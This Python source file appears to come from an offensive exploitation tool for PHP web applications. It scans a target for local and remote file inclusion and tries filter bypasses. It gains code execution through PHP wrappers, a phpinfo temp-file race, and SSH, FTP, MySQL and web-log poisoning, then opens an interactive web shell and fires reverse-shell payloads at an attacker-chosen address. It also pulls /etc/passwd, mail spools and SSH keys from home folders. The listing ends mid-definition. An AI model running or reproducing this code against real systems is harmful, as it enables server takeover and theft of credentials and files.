import os
import sys
import threading
import time
import urllib.parse
import urllib.parse
from queue import Queue
from threading import Thread

import regex
import requests
from core.closable_http_server import run_http_server
from core.constants import *
from core.constants import LOG_STACKTRACE_ON, LOG_DYNAMIC_PARAMETER, LOG_CONTENT_NOT_STABLE, LOG_CONTENT_STABLE
from core.filter_bypass import get_bypass_possibilities
from core.io import get_resource, save
from core.log import info, ask, warn, verbose, success, err, set_global_verbose, is_verbose_mode
from core.misc import dict_inject_marker, get_web_shell_post_cmd_src
from core.misc import get_web_shell_src
from core.mode import Mode
from core.models.req_input import InputRequest
from core.models.sock_address import SockAddress
from core.net import ssh_login, silent_kill_http_server, get_external_ip, ftp_login, mysql_login
from core.parse_utils import base64_decode_utf_8, get_possible_base64_strings, parse_etc_passwd, \
    is_valid_port, is_valid_ip, base64_encode_utf_8, decode_possible_base64_strings, is_valid_url, extract_cmd_response
from core.payload_data import core_get_by_name, core_get_common_doc_roots, core_get_linux_fuzz_arr, \
    core_get_log_files, core_get_home_rel, core_get_rev_shell_json_arr, core_get_proc_files
from core.str_utils import contains_words, join_char, substr, remove_prefix, longestCommonPrefix, longestCommonSuffix, \
    remove_suffix, random_str
from requests import Response
from requests.exceptions import ProxyError

"""
Http based shell supporting multiple modes
"""


class Webshell:
    current_directory = None
    user = None
    delimiter = "<sep>"

    def __init__(self, scan, mode: Mode, log_file_to_include=None):
        self.scan = scan
        self.mode = mode
        self.file_to_include = log_file_to_include

    def run(self):

        is_verbose = is_verbose_mode()

        set_global_verbose(False)

        self.current_directory = self.exec("pwd").strip("\\s")

        if self.current_directory == "":
            return

        self.user = self.exec("whoami") + "@" + self.exec("hostname")

        info("Web shell :: Type <'rev'> for reverse shell")

        while 1:

            # User input --------------------------------------------
            try:
                rev_shell_cmd = ask(f"{self.user}:{self.current_directory}$ ")
            except:
                print("\nUse <'exit'> or <'quit'> to exit")
                continue

            if rev_shell_cmd == "exit" or rev_shell_cmd == "quit":
                sys.exit(0)

            if rev_shell_cmd == "rev":
                port = self.scan.get_local_tcp_port()

                ip = self.scan.get_local_ip()

                info(f"Trying to get reverse shell at {ip}:{port}")

                # bash payloads
                for rev_shell_cmd in core_get_rev_shell_json_arr():
                    rev_shell_cmd = rev_shell_cmd.replace("$port", str(port)).replace("$ip", ip)
                    self.send_raw_cmd(rev_shell_cmd)
                continue

            output = self.exec(rev_shell_cmd)

            if output:
                print(output)

                self.send_raw_cmd(rev_shell_cmd)

        set_global_verbose(is_verbose)

    def exec(self, cmd):
        if not self.current_directory:
            self.current_directory = "."

        # redirect error stream to output
        if not cmd.endswith("2>&1"):
            cmd = cmd + " 2>&1"

        cmd = f"cd {self.current_directory}; {cmd}; echo \"{self.delimiter}\"; pwd"

        response = self.send_raw_cmd(cmd)

        return self.extract_web_shell_response_cmd(response)

    def send_raw_cmd(self, cmd):
        response = None
        if self.mode == Mode.data:
            payload = "data:text/plain;base64," + base64_encode_utf_8(get_web_shell_src(cmd))
            response = self.scan.send_payload(payload=payload)
        elif self.mode == Mode.php_input:
            payload = get_web_shell_src(cmd)
            response = self.scan.send_payload(PHP_INPUT, method='POST', data=payload)
        elif self.mode == Mode.expect:
            payload = "expect://" + cmd
            response = self.scan.send_payload(payload=payload)
        elif self.mode == Mode.log:
            response = self.scan.send_payload(payload=self.file_to_include, method="POST",
                                              data={WEB_SHELL_PARAM_NAME: cmd})
        elif self.mode == Mode.session:
            response = self.scan.send_payload(payload=self.file_to_include, method="POST",
                                              data={WEB_SHELL_PARAM_NAME: cmd})
        else:
            err("Unsupported mode for web shell", exit=True)
        return response

    def extract_web_shell_response_cmd(self, response: Response):

        cmd_result = None
        try:
            cmd_result = response.headers[WEB_SHELL_RESPONSE_HEADER]
        except:
            pass

        if cmd_result is None:
            try:
                cmd_result = extract_cmd_response(response.text)
            except:
                pass

        try:
            if cmd_result is None:
                warn("Shell probably not supported")
                return ""
            else:
                output = base64_decode_utf_8(cmd_result).strip('\n')
                spl = output.split(self.delimiter, 1)
                output = spl[0].strip("\n")
                self.current_directory = spl[1].strip("\n")
                return output
        except:
            return "Error occurred while parsing response"


"""
RCE with phpinfo()
"""


class PhpInfoLfiExploit:
    THREADS = 10
    tmp_files = Queue()
    pattern = regex.compile('(tmp_name\]\s+\S+\s+)(.*)')
    success = False
    file_name = 'payload.php'

    def __init__(self, scan, info_path, cmd):
        self.scan = scan
        self.positive_string = scan.unique_identifier
        self.file_content = f"<?php echo '{self.positive_string}'; system('{cmd}'); ?>"
        self.info_path = info_path

    def include(self):
        tmp_file = self.tmp_files.get(timeout=1)
        response = self.scan.send_payload(tmp_file)

        if self.positive_string in response.text:
            success("Command was executed")
            sys.exit(0)

    def thread_include(self):
        while not self.success:
            try:
                self.include()
                self.tmp_files.task_done()
            except:
                pass

    def upload(self):
        padding = "A" * 5000

        headers = {
            "HTTP_A": padding,
            "HTTP_B": padding,
            "HTTP_C": padding,
            "HTTP_D": padding,
            "HTTP_E": padding,
        }

        files = {'file': (self.file_name, self.file_content)}

        while not self.success:

            response = requests.post(self.info_path, headers=headers, params={"padding": padding},
                                     cookies={"padding": padding},
                                     files=files).text

            if 'tmp_name' in response:
                tmp_file = self.pattern.findall(response)[0][1]
                self.tmp_files.put(tmp_file)
                break
            else:
                err("File Name not found. Make sure file_uploads is enabled")
                self.success = True

    def start(self):
        info("Starting threads")
        for i in range(self.THREADS):
            t = threading.Thread(target=self.thread_include)
            t.daemon = True
            t.start()

        for i in range(self.THREADS):
            # keep on uploading shells
            while not self.success:
                self.upload()


"""
Scan Web Application for LFI vulnerabilities
"""


def user_input_file_to_include(i):
    entry = core_get_by_name(i)
    if entry:
        file = entry
    else:
        success_word = ask("Which word is in file (separate with ';'): ")

        file = {
            "file": i,
            "successWords": success_word.split(";")
        }
    return file


class Scan:
    # Server side stuff
    error_reporting_on = False
    param_reflected = False
    __document_root = None
    __server_suffix = None
    stable_content = None

    # Client side net stuff
    local_http_port = None
    local_tcp_port = None
    local_ip = None

    # log poisoning module
    target_ssh_port = None
    target_ftp_port = None
    target_mysql_port = None
    pma_path = None

    # what has been logged to user
    reports = []

    # which rce methods have been run so far
    rce_runs = []

    # log requests sent to target
    amount_payloads_sent = 0

    def __init__(self, req_input: InputRequest, proxy=None, follow_redirects=None, address: SockAddress = None,
                 http_port=None, output_dir=None, batch=False,
                 mode=Mode.all, input_mode_params=None):
        self.mode = mode
        self.batch = batch
        self.input_mode_params = input_mode_params
        self.domain = req_input.host
        self.url_script_path = req_input.url_script_path
        self.url_relative_path = urllib.parse.urlparse(self.url_script_path).path
        self.follow_redirects = follow_redirects
        self.params = req_input.params
        self.cookies = req_input.cookies
        self.data = req_input.data
        self.json_data = req_input.json
        self.extra_headers = req_input.extra_headers
        self.method = req_input.method

        if proxy:
            self.http_proxies = {
                "http": proxy,
                "https": proxy
            }
        else:
            self.http_proxies = {}

        if address:
            self.local_tcp_port = address.port
            self.local_ip = address.ip

        self.unique_identifier = str(time.time_ns()) + random_str()
        self.output_dir = os.path.join(output_dir, SAVE_FOLDER_NAME, self.domain)
        self.local_http_port = http_port
        self.__filter_bypass = None
        self.site_title = None

    def start(self):
        info(f"Start scan {self.domain}")

        exit_scan = False

        # Php Info ---------------#
        if self.mode == Mode.php_info:
            self.start_php_info()
            exit_scan = True
        # Php Wrapper ------------#
        if self.mode == Mode.all or self.mode == Mode.data:
            self.start_check_data_wrapper()
            exit_scan = True
        if self.mode == Mode.all or self.mode == Mode.expect:
            self.start_check_expect_wrapper()
            exit_scan = True
        if self.mode == Mode.all or self.mode == Mode.php_input:
            self.start_check_php_input_wrapper()
            exit_scan = True
        # RFI -------------------#
        if self.mode == Mode.all or self.mode == Mode.rfi:
            self.start_check_for_rfi()
            exit_scan = True

        if self.mode != Mode.all and exit_scan:
            sys.exit(0)

        info(f"Output Folder is {self.output_dir}")

        # check if content is stable for length based heuristics
        self.quick_target_check()

        if self.mode == Mode.all or self.mode == Mode.session:
            self.start_sess_check()

        if self.mode == Mode.all or self.mode == Mode.proc:
            self.start_proc_check()

        if self.mode == Mode.all or self.mode == Mode.log:
            self.start_check_for_log_file_rce()

        if self.mode == Mode.all or self.mode == Mode.filter:
            self.start_php_filter_fuzz()

        if self.mode == Mode.all or self.mode == Mode.fuzz:
            self.start_file_fuzz()

        info(f"Requests sent: {self.amount_payloads_sent}")

    def start_php_info(self):
        info("Check Php Info")

        try:
            info_path = self.input_mode_params[0]
        except:
            warn("No URL given")
            return

        if is_valid_url(info_path):
            cmd = ask("Enter Shell-Command to execute: ")
            exploit = PhpInfoLfiExploit(self, info_path, cmd)
            exploit.start()
        else:
            warn(f"Invalid PHP-Info URL: {info_path}")

    def start_check_data_wrapper(self):
        info("Check Php Data")

        testPlain = self.php_exec_print_timestamp()
        testPayload = "data:text/plain;base64," + base64_encode_utf_8(testPlain)
        response = self.send_payload(payload=testPayload).text

        if self.unique_identifier in response:
            success("data:// wrapper exploitable")

            # get web shell
            web_shell = Webshell(self, mode=Mode.data)
            web_shell.run()

        else:
            warn("data:// wrapper not exploitable")

    def start_check_expect_wrapper(self):
        info("Check Php Expect")

        testPlain = self.php_exec_print_timestamp()
        testPayload = PHP_EXPECT_WRAPPER + testPlain
        response = self.send_payload(payload=testPayload).text

        if self.unique_identifier in response:
            success("expect:// wrapper exploitable")

            # get web shell
            web_shell = Webshell(self, mode=Mode.expect)
            web_shell.run()

        else:
            warn("expect:// wrapper not exploitable")

    def start_check_php_input_wrapper(self):

        info("Check Php Input")

        payload = self.php_exec_print_timestamp()
        response = self.send_payload(payload=PHP_INPUT, data=payload).text

        if self.unique_identifier in response:
            success("php://input exploitable")

            # get web shell
            web_shell = Webshell(self, mode=Mode.php_input)
            web_shell.run()
        else:
            warn("php://input not exploitable")

    def start_sess_check(self):
        info("Check PHP Sessions")

        response = requests.get(self.url_script_path)

        PHP_SESS_ID_NAME = "PHPSESSID"

        if PHP_SESS_ID_NAME not in response.cookies:
            verbose("No PHP Session seems to be used")
            return
        else:
            if PHP_SESS_ID_NAME not in self.cookies:
                self.cookies[PHP_SESS_ID_NAME] = response.cookies[PHP_SESS_ID_NAME]

        sess_id = self.cookies.get(PHP_SESS_ID_NAME)

        tmp = ask(f"Enter poisoned PHPSESSID (Current is {sess_id}): ")

        if tmp:
            sess_id = tmp

        entry = {
            "file": [
                f"/var/lib/php/sessions/sess_{sess_id}",
                f"/var/lib/php5/sess_{sess_id}",
                f"/tmp/sess_{sess_id}"
            ],
            "successWords": [
                "s:",
                WEB_SHELL_PARAM_MISSING
            ],
            "rce": RCE_SESSION
        }

        files = entry['file']

        inc = False

        for file in files:
            deep_copy = dict(entry)
            deep_copy['file'] = file
            inc = self.try_include_file_with_bypass(deep_copy)
            if inc:
                break

        if inc:
            success(f"RCE via PHP Sessions possible.\nTry injecting \"{get_web_shell_post_cmd_src()}\"")

    def start_proc_check(self):

        info("Check File Descriptors")

        log_entries = core_get_proc_files()
        for entry in log_entries:
            files = entry['file']

            if isinstance(files, list):
                for file in files:
                    deep_copy = dict(entry)
                    deep_copy['file'] = file
                    self.try_include_file_with_bypass(deep_copy)
            else:
                self.try_include_file_with_bypass(entry)

    def start_check_for_log_file_rce(self):

        info("Check Log Poisoning")

        try:
            self.target_ftp_port = self.input_mode_params[0]
        except:
            pass

        if not is_valid_port(self.target_ftp_port):
            self.target_ftp_port = TARGET_DEFAULT_FTP_PORT
            warn(f"Defaulting FTP to {TARGET_DEFAULT_FTP_PORT}")

        try:
            self.target_ssh_port = self.input_mode_params[1]
        except:
            pass

        if not is_valid_port(self.target_ssh_port):
            self.target_ssh_port = TARGET_DEFAULT_SSH_PORT
            warn(f"Defaulting SSH to {TARGET_DEFAULT_SSH_PORT}")

        try:
            self.target_mysql_port = self.input_mode_params[2]
        except:
            pass

        if not is_valid_port(self.target_mysql_port):
            self.target_mysql_port = TARGET_DEFAULT_MYSQL_PORT
            warn(f"Defaulting MySQL to {TARGET_DEFAULT_MYSQL_PORT}")

        try:
            self.pma_path = self.input_mode_params[3]
        except:
            self.pma_path = TARGET_DEFAULT_PMA_PATH
            warn(f"Defaulting PMA Path to {TARGET_DEFAULT_PMA_PATH}")

        log_entries = core_get_log_files()

        for entry in log_entries:
            files = entry['file']

            if isinstance(files, list):
                for file in files:
                    deep_copy = dict(entry)
                    deep_copy['file'] = file
                    self.try_include_file_with_bypass(deep_copy)
            else:
                self.try_include_file_with_bypass(entry)

    def start_php_filter_fuzz(self):

        info("Check Filter")

        doc_roots = core_get_common_doc_roots()
        if self.document_root:
            doc_roots.insert(0, self.document_root)

        script_paths = [join_char(root, self.url_relative_path, "/") for root in doc_roots]

        files_to_check = []

        # try including script itself
        for path in script_paths:
            files_to_check.append({
                "file": path,
                "successWords": ["<?php", "?>", "<body>"]
            })

            # without extension
            files_to_check.append({
                "file": path.replace(".php", ""),
                "successWords": ["<?php", "?>", "<body>"]
            })

        # common *nix files; by default 644
        files_to_check.append(core_get_by_name("/etc/hosts"))
        files_to_check.append(core_get_by_name("/etc/passwd"))

        for file in files_to_check:
            included = self.php_filter_include(file)
            if included:
                break

        if self.filter_bypass:

            auto_fuzz = self.batch

            while not auto_fuzz:

                file_name = ask("[q=Quit][a=Auto-Fuzz] Enter File: ")

                if file_name == "":
                    continue

                if file_name == "q":
                    break

                auto_fuzz = file_name == "a"

                if auto_fuzz:
                    break

                file = user_input_file_to_include(file_name)

                included = self.php_filter_include(file)

                if not included:
                    warn(f"Failed including <'{file_name}'>")

            if auto_fuzz:
                for file_entry in core_get_linux_fuzz_arr():

                    file = file_entry['file']

                    if isinstance(file, list):
                        for f in file:
                            deep_copy = dict(file_entry)
                            deep_copy['file'] = f
                            included = self.php_filter_include(deep_copy)
                            if not included:
                                # warn(f"Failed including <'{f}'>")
                                pass
                    else:
                        included = self.php_filter_include(file_entry)
                        if not included:
                            # warn(f"Failed including <'{file}'>")
                            pass

        else:
            info("php://filter not exploitable")

    def start_file_fuzz(self):

        info("Check Fuzz")

        auto_fuzz = self.batch

        while not auto_fuzz:
            file_name = ask("[q=Quit][a=Auto-Fuzz] Enter File: ")

            if file_name == "":
                continue

            if file_name == "q":
                break

            auto_fuzz = file_name == "a"

            if auto_fuzz:
                break

            file = user_input_file_to_include(file_name)

            included = self.try_include_file_with_bypass(file)

            if not included:
                warn(f"Failed including <'{file_name}'>")

        if auto_fuzz:
            for file_entry in core_get_linux_fuzz_arr():

                file = file_entry['file']

                if isinstance(file, list):
                    for f in file:
                        deep_copy = dict(file_entry)
                        deep_copy['file'] = f
                        included = self.try_include_file_with_bypass(deep_copy)
                        if not included:
                            verbose(f"Failed including <'{f}'>")
                            pass
                else:
                    included = self.try_include_file_with_bypass(file_entry)
                    if not included:
                        verbose(f"Failed including <'{file}'>")
                        pass

    def start_check_for_rfi(self):

        info("Check for RFI")

        is_success = False

        for url in STABLE_URL_CONTENT:
            if STABLE_URL_CONTENT[url] in self.send_payload(payload=url).text:
                is_success = True
                success("allow_url_include is enabled")
                url = ask("Enter URL to include or [Enter] for locally served php shell: ")

                if url != "":
                    res = self.send_payload(payload=url).text
                    save("include.html", self.output_dir, res)
                    return 0

        if not is_success:
            y = ask("RFI seems not exploitable (or outgoing traffic blocked), still continue RFI checks? [Y][n]: ")
            if y != "Y" and y != "y":
                return

        payload_url = "http://" + self.get_local_ip() + ":" + str(self.enter_local_http_port())

        # setup server
        php_rev_shell_src = self.prepare_php_shell()
        info("Serving shell on " + payload_url)
        http_server = Thread(target=run_http_server, args=(self.local_http_port, php_rev_shell_src))
        http_server.start()

        ask("Start Shell at %i [Press Enter]: " % self.local_tcp_port)

        self.send_payload(payload=payload_url)

        info("Waiting 5s for request ..")
        time.sleep(5)

        if http_server.is_alive():
            warn("RFI not exploitable")
            # terminate http server by sending request
            silent_kill_http_server(payload_url)

    # Sub procedures ---------------------------------------------------------- #

    """
    returns true if file was successfully included
    """

    def php_filter_include(self, payload: dict, **kwargs) -> bool:

        result = []

        file_path = payload['file']
        filter_words = payload['successWords']

        # found filter already, apply it
        if self.filter_bypass:
            payload = self.filter_bypass.adjust(f"php://filter/convert.base64-encode/resource={file_path}")
            response = self.send_payload_and_cut(
                payload=payload,
                **kwargs)

            base64_enc_strings = get_possible_base64_strings(response)

            for b64 in base64_enc_strings:
                string = base64_decode_utf_8(b64)
                if string:
                    if filter_words is None or contains_words(string, filter_words):
                        result.append(string)

        if len(result) == 0:

            if self.filter_bypass:
                verbose(f"Existing filter not working with inclusion of <'{file_path}'>")

            hide_debug = False
            # no filter found so far/ existing filter didnt seem to work
            filters = get_bypass_possibilities()

            for bypass in filters:

                payload = bypass.adjust(file_path)
                response = self.send_payload_and_cut(
                    payload="php://filter/convert.base64-encode/resource=%s" % payload, hide_debug=hide_debug,
                    **kwargs)

                if not hide_debug:
                    hide_debug = True

                for string in decode_possible_base64_strings(response):
                    if filter_words is None or contains_words(string, filter_words):
                        result.append(string)

                if len(result) > 0:
                    self.filter_bypass = bypass
                    break
                else:
                    continue  # try next

        if len(result) == 1:
            info(f"Successfully included {file_path}")
            save(file_path, self.output_dir, result)
        elif len(result) > 1:
            info(f"Successfully included {file_path}")
            warn("Found multiple b64 strings")
            save(file_path, self.output_dir, result)

        return len(result) > 0

    def try_include_file_with_bypass(self, payload: dict, **kwargs) -> bool:

        file_path = payload['file']

        # found bypass already, apply it
        if self.filter_bypass:
            payload['file'] = self.filter_bypass.adjust(file_path)
            is_success = self.try_rce_file_without_bypass(payload, file_path)
            if is_success:
                return True

        if self.filter_bypass:
            verbose(f"Existing filter not working with inclusion of <'{file_path}'>")

        # no filter found so far/ existing filter didnt seem to work
        filters = get_bypass_possibilities()
        hide_debug = False

        for bypass in filters:

            payload['file'] = bypass.adjust(file_path)
            is_success = self.try_rce_file_without_bypass(payload, file_path, hide_debug=hide_debug)

            if not hide_debug:
                hide_debug = True

            if is_success:
                self.filter_bypass = bypass
                return True

        # no bypass found
        return False

    """
    check if one file can be included and save it
    return true if file was successfully included
    """

    def try_rce_file_without_bypass(self, payload: dict, save_as_file=None, hide_debug=False, **kwargs) -> bool:

        file_to_include = payload['file']

        if save_as_file is None:
            save_as_file = file_to_include

        response = self.send_payload_and_cut(payload=file_to_include, hide_debug=hide_debug, **kwargs)

        if "Permission denied in" in response:
            if not hide_debug:
                warn("No permission to view %s" % file_to_include)

        if "failed to open stream" in response:
            if not hide_debug:
                # warn("Failed opening %s" % file_to_include)
                pass

        success_words = payload.get('successWords')
        success_regex = payload.get('successRegex')

        try:

            if success_words:
                is_success = contains_words(response, success_words)
            elif success_regex:
                is_success = bool(regex.match(response, success_regex))
            else:
                warn("No validation for " + save_as_file)
                is_success = False

            if is_success:

                msg = payload.get('onSuccess')
                if msg:
                    success(msg)

                save(save_as_file, self.output_dir, response)

                rce_id = payload.get('rce')

                # remember old attempts
                if rce_id and (rce_id not in self.rce_runs):

                    if rce_id in [RCE_SSH_LOG, RCE_FTP_LOG, RCE_VIA_MYSQL_LOG]:
                        self.rce_runs.append(rce_id)

                    php_timestamp_check_payload = self.php_exec_print_timestamp()
                    php_web_shell_payload = get_web_shell_post_cmd_src()

                    success("Possible RCE method found %s" % file_to_include)

                    if rce_id == RCE_VIA_SSH_KEYS:
                        info("Parsing /etc/passwd ..")

                        response = self.send_payload_and_cut(payload=file_to_include, **kwargs)

                        all_folders = parse_etc_passwd(response)

                        home_folders = []

                        for folder in all_folders:

                            if "/www" in folder or "/html" in folder:
                                self.document_root = folder

                            if "/home/" in folder:
                                home_folders.append(folder)
                                info(f"Found home folder: {folder}", bold=True)
                                pass

                        # check for ssh keys, mail file, and other sensitive files
                        for home_folder in home_folders:

                            mail_file = home_folder.replace("/home/", "/var/mail/")

                            info(f"Check {mail_file}")

                            file = {
                                "file": mail_file,
                                "successWords": [
                                    "Message-Id:",
                                    "MIME-Version",
                                    "Return-Path"
                                ]
                            }

                            included = self.try_include_file_with_bypass(payload=file)

                            if included:
                                # check if user already poisoned mails

                                entry = {
                                    "file": mail_file,
                                    "successWords": [
                                        WEB_SHELL_PARAM_MISSING
                                    ],
                                    "rce": RCE_MAIL
                                }

                                inc = self.try_include_file_with_bypass(entry)

                                if inc:
                                    success(
                                        f"Mail poisoning possible via <'{mail_file}'>.\nTry injecting \"{get_web_shell_post_cmd_src()}\"")

                            # ssh and other user files

                            home_files = core_get_home_rel()

                            for home_file in home_files:
                                entry_copy = dict(home_file)

                                files = entry_copy['file']

                                if isinstance(files, list):
                                    for file in files:
                                        deep_copy = dict(entry_copy)
                                        deep_copy['file'] = home_folder + "/" + file
                                        self.try_include_file_with_bypass(deep_copy)
                                else:
                                    entry_copy['file'] = home_folder + "/" + files
                                    self.try_include_file_with_bypass(entry_copy)

                    elif rce_id == RCE_SSH_LOG:
                        info(f"Attempt poisoning SSH login (port={self.target_ssh_port})")

                        ssh_reach = ssh_login(self.domain, php_timestamp_check_payload, "pass123",
                                              self.target_ssh_port)

                        response = self.send_payload_and_cut(payload=file_to_include)

                        if ssh_reach and self.unique_identifier in response:
                            success("RCE via SSH log poisoning")

                            # init web shell
                            ssh_login(self.domain, php_web_shell_payload, "pass123", self.target_ssh_port)

                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
                            web_shell.run()
                        else:
                            reason = ""
                            if not ssh_reach:
                                reason = f"[Reason: SSH error via port {self.target_ssh_port}]"
                            err(f"SSH Not exploitable {reason}")

                    elif rce_id == RCE_FTP_LOG:
                        info(f"Attempt poisoning FTP login (port={self.target_ftp_port})")

                        ssh_reach = ftp_login(self.domain, php_timestamp_check_payload, "pass123",
                                              self.target_ftp_port)

                        response = self.send_payload_and_cut(payload=file_to_include)

                        if ssh_reach and self.unique_identifier in response:
                            success("RCE via FTP log poisoning")

                            # init web shell
                            ftp_login(self.domain, php_web_shell_payload, "pass123", self.target_ftp_port)

                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
                            web_shell.run()
                        else:
                            reason = ""
                            if not ssh_reach:
                                reason = f"[Reason: FTP error via port {self.target_ftp_port}]"
                            err(f"FTP Not exploitable {reason}")

                    elif rce_id == RCE_VIA_MYSQL_LOG:
                        info(f"Attempt poisoning MySQL login (port={self.target_mysql_port})")

                        mysql_reach = mysql_login(self.domain, php_timestamp_check_payload, "pass123",
                                                  self.target_mysql_port)

                        response = self.send_payload_and_cut(payload=file_to_include)

                        if mysql_reach and self.unique_identifier in response:
                            success("RCE via MySQL log poisoning")

                            # init web shell
                            mysql_login(self.domain, php_web_shell_payload, "pass123", self.target_mysql_port)

                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
                            web_shell.run()
                        else:
                            reason = ""
                            if not mysql_reach:
                                reason = f"[Reason: MySQL error via port {self.target_mysql_port}]"
                            err(f"MySQL Not exploitable {reason}")

                    elif rce_id == RCE_HTTP_LOG:

                        self.send_payload(payload="", extra_headers={"User-Agent": php_timestamp_check_payload})

                        response = self.send_payload_and_cut(payload=file_to_include)

                        if self.unique_identifier in response:
                            success("RCE via webserver log poisoning")

                            # init web shell
                            self.send_payload(payload="", extra_headers={"User-Agent": php_web_shell_payload})

                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
                            web_shell.run()
                        else:
                            err("Webserver logs not exploitable")

                    elif rce_id == RCE_MAIL:

                        if WEB_SHELL_PARAM_MISSING in response:  # user injected successfully
                            # init web shell

                            web_shell = Webshell(self, mode=Mode.session, log_file_to_include=file_to_include)
                            web_shell.run()

                    elif rce_id == RCE_SESSION:

                        if WEB_SHELL_PARAM_MISSING in response:  # user injected successfully
                            # init web shell

                            web_shell = Webshell(self, mode=Mode.session, log_file_to_include=file_to_include)
                            web_shell.run()

                    elif rce_id == RCE_PROC_ENV:

                        self.send_payload(payload="", extra_headers={"User-Agent": php_timestamp_check_payload})

                        response = self.send_payload_and_cut(payload=file_to_include)

                        if self.unique_identifier in response:
                            success("RCE via process env")

                            # init web shell
                            self.send_payload(payload="", extra_headers={"User-Agent": php_web_shell_payload})

                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
                            web_shell.run()
                        else:
                            err("Process env not exploitable")

                    elif rce_id == RCE_PROC_FD:
                        pass

                    else:
                        err(f"Unknown RCE exploit with ID {rce_id}")

        except Exception as e:
            import traceback
            err("There was an unknown error for <'%s'>\n%s" % (file_to_include, str(e)))
            traceback.print_exc()
            sys.exit(0)
            pass

        return is_success

    def send_payload(self, payload=None, bypass=False, method=None, data=None, json_data=None, params=None,
                     cookies=None,
                     extra_headers=None, hide_debug=False,
                     **kwargs) -> Response:

        url_script_path = self.url_script_path

        if method is None:
            method = self.method
        if data is None:
            data = self.data
        if params is None:
            params = self.params
        if cookies is None:
            cookies = self.cookies
        if extra_headers is None:
            extra_headers = self.extra_headers
        if json_data is None:
            json_data = self.json_data

        if payload is not None:

            if self.filter_bypass and bypass:
                payload = self.filter_bypass.adjust(payload)

            if isinstance(data, dict):
                data = dict_inject_marker(data, payload)
            else:  # string
                data = data.replace(MARKER, payload)

            json_data = dict_inject_marker(json_data, payload)
            params = dict_inject_marker(params, payload)
            cookies = dict_inject_marker(cookies, payload)
            extra_headers = dict_inject_marker(extra_headers, payload)

            url_script_path = url_script_path.replace(MARKER, payload)

        response = ""
        try:
            response = requests.request(method=method, headers=extra_headers, cookies=cookies,
                                        url=url_script_path, json=json_data,
                                        proxies=self.http_proxies,
                                        params=params, allow_redirects=self.follow_redirects, verify=False,
                                        data=data, **kwargs)

            if self.follow_redirects is None and response.status_code == 302:
                loc = response.headers['Location']
                self.follow_redirects = ask(f"Follow redirects to {loc}? [Y][n]: ") != "n"

            self.amount_payloads_sent = self.amount_payloads_sent + 1

            if not hide_debug:
                verbose(f"Payload: {payload}\tStatus: ({response.status_code}) [Size: {len(response.content)}]")

            self.analyze_response(payload, response.text)
        except ConnectionResetError:
            err("Connection was reset by target", exit=True)
        except ProxyError:
            err("Connection reset by proxy", exit=True)
        except Exception as e:
            err(f"Unknown exception occurred <'{str(e)}'>", exit=True)

        return response

    def send_payload_and_cut(self, post_process_response=None, **kwargs) -> str:
        response = self.send_payload(**kwargs).text

        response = remove_prefix(response, longestCommonPrefix([self.stable_content, response]))

        long_suffix = longestCommonSuffix([self.stable_content, response])

        response = remove_suffix(response, long_suffix)

        if post_process_response:
            response = post_process_response(response)

        return response

    def analyze_response(self, payload, res):
        if payload in res and not self.param_reflected:
            self.report(LOG_DYNAMIC_PARAMETER)
            self.param_reflected = True
        if contains_words(res, ERROR_INCLUDE_LOG) and not self.error_reporting_on:
            self.report(LOG_STACKTRACE_ON)
            self.error_reporting_on = True

            # try to parse stacktrace
            if not self.document_root:
                abs_path = substr(res, "Permission denied in <b>", "</b>")
                if not abs_path:
                    abs_path = substr(res, "No such file or directory in <b>", "</b>")
                if abs_path:
                    rm = longestCommonSuffix([abs_path, self.url_script_path])
                    abs_path = abs_path.replace(rm, "")
                    self.document_root = abs_path

            if not self.server_suffix:

                server_file_name = substr(res, "Failed opening '", "' for inclusion")
                if not server_file_name:
                    server_file_name = substr(res, "include(", "): failed to open")

                if payload in server_file_name:
                    server_file_name = server_file_name.replace(payload, "")
                    self.server_suffix = server_file_name

        title = substr(res, "<title>", "</title>")
        if title and not self.site_title:
            self.site_title = title

    def prepare_php_shell(self):
        src = get_resource("revshell.php")
        return src % (self.get_local_ip(), self.get_local_tcp_port())

    def report(self, s):
        if s not in self.reports:
            info(s, bold=True)
            self.reports.append(s)

    def quick_target_check(self, param_fuzzing=False):

        self.send_payload(payload="trigger_possible_error_logs")

        # check size
        _min = sys.maxsize
        _max = 0
        cache = []
        for i in range(0, 2):
            res = self.send_payload(payload="test").text
            tmp = len(res)
            _min = min(_min, tmp)
            _max = max(_max, tmp)
            time.sleep(0.2)
            cache.append(res)

        diff = _max - _min

        if diff == 0:
            self.stable_content = longestCommonPrefix(cache)
            self.report(LOG_CONTENT_STABLE)
        else:
            self.report(LOG_CONTENT_NOT_STABLE)

        # common *nix files; by default 644
        for safe_path in [core_get_by_name("/etc/hosts"), core_get_by_name("/etc/passwd")]:
            included = self.try_include_file_with_bypass(safe_path)
            if included:
                break

        if not self.filter_bypass and not param_fuzzing:
            y = ask("No bypass found, move on? [Y][n]: ")
            if y != "" and y != "Y" and y != "y":
                sys.exit(0)

    def get_local_ip(self):

        if self.local_ip:
            return self.local_ip

        ext_ip = get_external_ip()

        ip = ask(f"Address for Reverse Connection [Default {ext_ip}]: ")

        if not is_valid_ip(ip):
            self.local_ip = ext_ip

            if ip:
                warn(f"Invalid IP entered, defaulting to {ext_ip}")
        else:
            self.local_ip = ip

        return self.local_ip

    def get_local_tcp_port(self):

        if self.local_tcp_port:
            return self.local_tcp_port

        port = ask(f"Port for Reverse Connection [Default {DEFAULT_TCP_PORT}]: ")

        if not is_valid_port(port):
            port = DEFAULT_TCP_PORT
            if not port:
                warn(f"Invalid port entered, defaulting to {DEFAULT_TCP_PORT}")

        self.local_tcp_port = int(port)

        return self.local_tcp_port

    def enter_local_http_port(self):

        if self.local_http_port:
            return self.local_http_port

        port = ask(f"Port for HTTP Server [Default {DEFAULT_HTTP_PORT}]: ")

        if not is_valid_port(port):
            port = DEFAULT_HTTP_PORT

            if not port:
                warn(f"Invalid port entered, defaulting to {DEFAULT_HTTP_PORT}")

        self.local_http_port = int(port)

        return self.local_http_port

    @property
    def document_root(self):
        return self.__document_root

    @document_root.setter
    def document_root(self, p):
        if self.__document_root:
            return

        info(f"Document Root: {p}", bold=True)
        self.__document_root = p

    @property
    def server_suffix(self):
        return self.__server_suffix

    @server_suffix.setter
    def server_suffix(self, p):
        if self.__server_suffix:
            return

        info(f"Server appends Suffix: {p}", bold=True)
        self.__server_suffix = p

    @property
    def filter_bypass(self):
